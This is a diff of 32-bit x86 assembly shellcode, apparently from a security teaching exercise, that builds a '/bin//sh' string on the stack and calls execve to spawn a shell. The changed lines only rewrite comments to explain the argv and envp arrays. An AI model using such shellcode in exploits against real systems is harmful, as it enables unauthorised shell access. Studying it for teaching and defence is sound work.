@@ -7,8 +7,8 @@ BITS 32
   push 0x6e69622f   ; push "/bin" to the stack
   mov ebx, esp      ; (#1) address of "/bin//sh"
   push eax          ; push 4-bytes null
-  mov edx, esp      ; (#3) empty array for envp
+  mov edx, esp      ; (#3) envp = [NULL]
   push ebx          ; push ptr to /bin//sh string to stack
-  mov ecx, esp      ; (#2) argv array, argv[0]=ebx
+  mov ecx, esp      ; (#2) argv array = ["/bin//sh", NULL]
   mov al, 11        ; syscall #11 execve
-  int 0x80          ; do it
+  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
